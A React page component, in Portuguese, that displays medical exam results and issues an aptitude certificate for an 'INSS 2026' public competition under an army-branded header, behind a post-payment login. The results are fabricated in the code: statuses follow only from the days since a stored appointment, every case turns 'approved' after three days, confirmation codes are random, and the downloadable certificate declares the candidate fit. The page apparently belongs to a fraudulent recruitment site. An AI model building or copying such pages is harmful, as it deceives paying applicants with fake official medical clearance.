import { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { ExercitoHeader } from '@/components/ExercitoHeader';
import { ExercitoFooter } from '@/components/ExercitoFooter';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { CheckCircle, Clock, AlertTriangle, FileText, Calendar, Download, RefreshCw, ArrowRight, Shield } from 'lucide-react';
import { useClarityEvents } from '@/hooks/use-clarity-events';

interface ExamResult {
  id: string;
  status: 'scheduled' | 'in_progress' | 'completed' | 'approved' | 'requires_review' | 'failed';
  examDate: string;
  examTime: string;
  centerName: string;
  confirmationCode: string;
  results?: {
    vitalSigns: 'approved' | 'requires_review' | 'pending';
    mobility: 'approved' | 'requires_review' | 'pending';
    vision: 'approved' | 'requires_review' | 'pending';
    hearing: 'approved' | 'requires_review' | 'pending';
    generalHealth: 'approved' | 'requires_review' | 'pending';
  };
  overallResult?: 'approved' | 'conditional' | 'requires_reexam' | 'pending';
  nextSteps?: string;
  certificateUrl?: string;
}

export default function ResultadosMedicosPage() {
  const [, setLocation] = useLocation();
  const [examResult, setExamResult] = useState<ExamResult | null>(null);
  const [loading, setLoading] = useState(true);
  const [candidateName, setCandidateName] = useState('');
  const { trackEvent } = useClarityEvents();

  useEffect(() => {
    window.scrollTo(0, 0);
    
    // Check if user passed through login validation
    const loginValidated = localStorage.getItem('loginValidated');
    if (!loginValidated) {
      setLocation('/login-pos-pagamento');
      return;
    }
    
    loadExamStatus();
    loadUserData();
    
    trackEvent('medical_results_page_accessed', {
      page: 'resultados_medicos',
      timestamp: new Date().toISOString()
    });
  }, []);

  const loadUserData = () => {
    const userData = localStorage.getItem('userData') || localStorage.getItem('userMedicalLogin');
    if (userData) {
      try {
        const parsedUserData = JSON.parse(userData);
        const fullName = parsedUserData.name ||
                         parsedUserData.nomeCompleto ||
                         parsedUserData.autoFilledData?.nome || '';
        if (fullName) {
          const firstName = fullName.split(' ')[0];
          setCandidateName(firstName.charAt(0).toUpperCase() + firstName.slice(1).toLowerCase());
        }
      } catch (error) {
        console.log('Error loading user data:', error);
      }
    }
  };

  const loadExamStatus = async () => {
    try {
      setLoading(true);
      
      // Try to get confirmation code from localStorage
      const confirmationCode = localStorage.getItem('medicalConfirmationCode') ||
                               ('MED-' + Math.random().toString(36).substr(2, 6).toUpperCase());
      const appointmentData = localStorage.getItem('medicalAppointment');
      
      if (appointmentData) {
        const appointment = JSON.parse(appointmentData);
        
        // Simulate exam status based on current time and appointment
        const examDate = new Date(appointment.date);
        const now = new Date();
        
        let status: ExamResult['status'] = 'scheduled';
        let results = undefined;
        let overallResult = undefined;
        let nextSteps = undefined;
        
        // Simulate different statuses based on time
        if (examDate < now) {
          const daysSinceExam = Math.floor((now.getTime() - examDate.getTime()) / (1000 * 60 * 60 * 24));
          
          if (daysSinceExam >= 3) {
            status = 'approved';
            results = {
              vitalSigns: 'approved' as const,
              mobility: 'approved' as const,
              vision: 'approved' as const,
              hearing: 'approved' as const,
              generalHealth: 'approved' as const
            };
            overallResult = 'approved' as const;
            nextSteps = 'Exame medico aprovado. Voce esta apto para continuar no Concurso Público INSS 2026.';
          } else if (daysSinceExam >= 1) {
            status = 'completed';
            results = {
              vitalSigns: 'approved' as const,
              mobility: 'approved' as const,
              vision: 'requires_review' as const,
              hearing: 'approved' as const,
              generalHealth: 'pending' as const
            };
            overallResult = 'conditional' as const;
            nextSteps = 'Exame realizado. Aguardando análise final dos resultados pelo médico responsável.';
          } else {
            status = 'in_progress';
            nextSteps = 'Exame realizado hoje. Resultados estarão disponíveis em 1-3 dias úteis.';
          }
        }
        
        const mockResult: ExamResult = {
          id: confirmationCode,
          status,
          examDate: appointment.date,
          examTime: appointment.time,
          centerName: appointment.center.name,
          confirmationCode,
          results,
          overallResult,
          nextSteps
        };
        
        setExamResult(mockResult);
      } else {
        // No appointment found, redirect to scheduling
        setLocation('/agendamento-medico');
        return;
      }
    } catch (error) {
      console.error('Error loading exam status:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleRefreshStatus = () => {
    trackEvent('medical_results_refreshed', {
      confirmation_code: examResult?.confirmationCode,
      current_status: examResult?.status,
      page: 'resultados_medicos',
      timestamp: new Date().toISOString()
    });
    
    loadExamStatus();
  };

  const handleDownloadCertificate = () => {
    if (!examResult) return;
    
    trackEvent('medical_certificate_downloaded', {
      confirmation_code: examResult.confirmationCode,
      overall_result: examResult.overallResult,
      page: 'resultados_medicos',
      timestamp: new Date().toISOString()
    });

    const certificateContent = `
CERTIFICADO DE APTIDÃO MÉDICA - EXAME DE COMPETÊNCIA MÍNIMA

Código de Confirmação: ${examResult.confirmationCode}

DADOS DO CANDIDATO:
Nome: ${candidateName || 'Não informado'}

DADOS DO EXAME:
Data: ${new Date(examResult.examDate).toLocaleDateString('pt-BR', { 
  weekday: 'long', day: 'numeric', month: 'long', year: 'numeric' 
})}
Horário: ${examResult.examTime}
Local: ${examResult.centerName}

RESULTADOS DA AVALIAÇÃO MÉDICA:
- Sinais Vitais: ${examResult.results?.vitalSigns === 'approved' ? 'APROVADO' : 'EM ANÁLISE'}
- Mobilidade e Coordenação: ${examResult.results?.mobility === 'approved' ? 'APROVADO' : 'EM ANÁLISE'}
- Avaliação Visual: ${examResult.results?.vision === 'approved' ? 'APROVADO' : 'EM ANÁLISE'}
- Avaliação Auditiva: ${examResult.results?.hearing === 'approved' ? 'APROVADO' : 'EM ANÁLISE'}
- Saúde Geral: ${examResult.results?.generalHealth === 'approved' ? 'APROVADO' : 'EM ANÁLISE'}

RESULTADO GERAL: ${examResult.overallResult === 'approved' ? 'APTO' : 'EM ANÁLISE'}

OBSERVAÇÕES:
${examResult.nextSteps || 'Nenhuma observação adicional.'}

Este certificado comprova que o candidato possui as condicoes fisicas minimas
necessarias para realizar atividades basicas do dia a dia e esta apto para
participar do Concurso Público INSS 2026.

Data de emissão: ${new Date().toLocaleDateString('pt-BR')}
    `;

    const blob = new Blob([certificateContent], { type: 'text/plain' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `certificado-aptidao-medica-${examResult.confirmationCode}.txt`;
    a.click();
    window.URL.revokeObjectURL(url);
  };

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'approved': return 'text-green-600';
      case 'scheduled': return 'text-blue-600';
      case 'in_progress': return 'text-yellow-600';
      case 'completed': return 'text-orange-600';
      case 'requires_review': return 'text-yellow-600';
      case 'failed': return 'text-red-600';
      default: return 'text-gray-600';
    }
  };

  const getStatusIcon = (status: string) => {
    switch (status) {
      case 'approved': return <CheckCircle className="w-5 h-5 text-green-600" />;
      case 'scheduled': return <Calendar className="w-5 h-5 text-blue-600" />;
      case 'in_progress': return <Clock className="w-5 h-5 text-yellow-600" />;
      case 'completed': return <Clock className="w-5 h-5 text-orange-600" />;
      case 'requires_review': return <AlertTriangle className="w-5 h-5 text-yellow-600" />;
      case 'failed': return <AlertTriangle className="w-5 h-5 text-red-600" />;
      default: return <Clock className="w-5 h-5 text-gray-600" />;
    }
  };

  const getStatusText = (status: string) => {
    switch (status) {
      case 'approved': return 'Aprovado - Apto para Serviço';
      case 'scheduled': return 'Agendado';
      case 'in_progress': return 'Em Andamento';
      case 'completed': return 'Concluído - Aguardando Resultado';
      case 'requires_review': return 'Requer Revisão Médica';
      case 'failed': return 'Não Aprovado';
      default: return 'Status Desconhecido';
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-[#0063AF] mx-auto mb-4"></div>
          <p className="text-gray-600">Carregando status do exame médico...</p>
        </div>
      </div>
    );
  }

  if (!examResult) {
    return (
      <div className="min-h-screen bg-gray-50 flex flex-col">
        <ExercitoHeader />
        <main className="flex-1 flex items-center justify-center">
          <div className="text-center">
            <AlertTriangle className="w-16 h-16 text-yellow-500 mx-auto mb-4" />
            <h1 className="text-2xl font-bold text-gray-900 mb-2">Exame Não Encontrado</h1>
            <p className="text-gray-600 mb-6">Não encontramos informações sobre seu exame médico.</p>
            <Button onClick={() => setLocation('/agendamento-medico')}>
              Agendar Exame Médico
            </Button>
          </div>
        </main>
        <ExercitoFooter />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      <ExercitoHeader />
      
      <main className="flex-1 container mx-auto max-w-4xl px-4 py-6">
        {/* Header */}
        <div className="text-center mb-8">
          <h1 className="text-3xl font-bold text-gray-900 mb-2">
            Status do Exame Médico
          </h1>
          {candidateName && (
            <p className="text-lg text-gray-700 mb-4">
              {candidateName}, acompanhe o status do seu Exame de Competência Mínima
            </p>
          )}
        </div>

        {/* Current Status */}
        <Card className="mb-8">
          <CardContent className="p-6">
            <div className="flex items-center justify-between mb-6">
              <h2 className="text-xl font-semibold text-gray-900">Status Atual</h2>
              <Button
                onClick={handleRefreshStatus}
                variant="outline"
                size="sm"
              >
                <RefreshCw className="w-4 h-4 mr-2" />
                Atualizar
              </Button>
            </div>
            
            <div className="flex items-center space-x-4 p-4 bg-gray-50 rounded-lg">
              {getStatusIcon(examResult.status)}
              <div className="flex-1">
                <h3 className={`font-semibold ${getStatusColor(examResult.status)}`}>
                  {getStatusText(examResult.status)}
                </h3>
                <p className="text-sm text-gray-600">
                  Código: {examResult.confirmationCode}
                </p>
              </div>
            </div>
            
            {examResult.nextSteps && (
              <div className="mt-4 p-4 bg-blue-50 border border-blue-200 rounded-lg">
                <p className="text-blue-800 text-sm">{examResult.nextSteps}</p>
              </div>
            )}
          </CardContent>
        </Card>

        {/* Exam Details */}
        <Card className="mb-8">
          <CardContent className="p-6">
            <h2 className="text-xl font-semibold text-gray-900 mb-6">Detalhes do Exame</h2>
            
            <div className="grid md:grid-cols-3 gap-4 text-sm">
              <div>
                <p className="font-medium text-gray-900">Data</p>
                <p className="text-gray-700">
                  {new Date(examResult.examDate).toLocaleDateString('pt-BR', { 
                    weekday: 'long', 
                    day: 'numeric', 
                    month: 'long', 
                    year: 'numeric' 
                  })}
                </p>
              </div>
              <div>
                <p className="font-medium text-gray-900">Horário</p>
                <p className="text-gray-700">{examResult.examTime}</p>
              </div>
              <div>
                <p className="font-medium text-gray-900">Local</p>
                <p className="text-gray-700">{examResult.centerName}</p>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Results Details */}
        {examResult.results && (
          <Card className="mb-8">
            <CardContent className="p-6">
              <h2 className="text-xl font-semibold text-gray-900 mb-6">Resultados por Categoria</h2>
              
              <div className="space-y-4">
                {Object.entries(examResult.results).map(([category, result]) => {
                  const categoryNames = {
                    vitalSigns: 'Sinais Vitais',
                    mobility: 'Mobilidade e Coordenação',
                    vision: 'Avaliação Visual',
                    hearing: 'Avaliação Auditiva',
                    generalHealth: 'Saúde Geral'
                  };
                  
                  return (
                    <div key={category} className="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
                      <span className="font-medium text-gray-900">
                        {categoryNames[category as keyof typeof categoryNames]}
                      </span>
                      <div className="flex items-center space-x-2">
                        {result === 'approved' && (
                          <>
                            <CheckCircle className="w-4 h-4 text-green-600" />
                            <span className="text-green-600 font-medium">Aprovado</span>
                          </>
                        )}
                        {result === 'requires_review' && (
                          <>
                            <AlertTriangle className="w-4 h-4 text-yellow-600" />
                            <span className="text-yellow-600 font-medium">Em Revisão</span>
                          </>
                        )}
                        {result === 'pending' && (
                          <>
                            <Clock className="w-4 h-4 text-gray-600" />
                            <span className="text-gray-600 font-medium">Pendente</span>
                          </>
                        )}
                      </div>
                    </div>
                  );
                })}
              </div>
            </CardContent>
          </Card>
        )}

        {/* Overall Result */}
        {examResult.overallResult && (
          <Card className={`mb-8 ${
            examResult.overallResult === 'approved' 
              ? 'border-green-200 bg-green-50' 
              : 'border-yellow-200 bg-yellow-50'
          }`}>
            <CardContent className="p-6">
              <div className="flex items-center space-x-4">
                {examResult.overallResult === 'approved' ? (
                  <>
                    <Shield className="w-8 h-8 text-green-600" />
                    <div>
                      <h3 className="text-lg font-semibold text-green-900">
                        Resultado Final: APTO
                      </h3>
                      <p className="text-green-800">
                        Você foi aprovado na Perícia Médica Admissional e está apto para 
                        continuar no Concurso Público INSS 2026.
                      </p>
                    </div>
                  </>
                ) : (
                  <>
                    <Clock className="w-8 h-8 text-yellow-600" />
                    <div>
                      <h3 className="text-lg font-semibold text-yellow-900">
                        Resultado Final: Em Análise
                      </h3>
                      <p className="text-yellow-800">
                        Seu exame está sendo analisado pelo médico responsável. O resultado final 
                        será disponibilizado em breve.
                      </p>
                    </div>
                  </>
                )}
              </div>
            </CardContent>
          </Card>
        )}

        {/* Action Buttons */}
        <div className="flex flex-col sm:flex-row gap-4 justify-center">
          {examResult.overallResult === 'approved' && (
            <Button
              onClick={handleDownloadCertificate}
              className="px-6 py-3"
            >
              <Download className="w-5 h-5 mr-2" />
              Baixar Certificado de Aptidão
            </Button>
          )}
          
          {examResult.status === 'scheduled' && (
            <Button
              onClick={() => setLocation('/confirmacao-medica')}
              variant="outline"
              className="px-6 py-3"
            >
              <FileText className="w-5 h-5 mr-2" />
              Ver Detalhes do Agendamento
            </Button>
          )}
        </div>

        {/* Next Steps */}
        {examResult.overallResult === 'approved' && (
          <Card className="mt-8">
            <CardContent className="p-6">
              <h2 className="text-xl font-semibold text-gray-900 mb-4">Próximas Etapas</h2>
              <div className="space-y-3 text-sm">
                <div className="flex items-center space-x-3">
                  <CheckCircle className="w-4 h-4 text-green-600" />
                  <span>Exame médico de competência mínima aprovado</span>
                </div>
                <div className="flex items-center space-x-3">
                  <ArrowRight className="w-4 h-4 text-blue-600" />
                  <span>Aguardar convocação para a prova de seleção</span>
                </div>
                <div className="flex items-center space-x-3">
                  <Clock className="w-4 h-4 text-gray-600" />
                  <span>Preparar documentacao para contratacao e Programa de Integracao (se aprovado)</span>
                </div>
              </div>
            </CardContent>
          </Card>
        )}
      </main>

      <ExercitoFooter />
    </div>
  );
}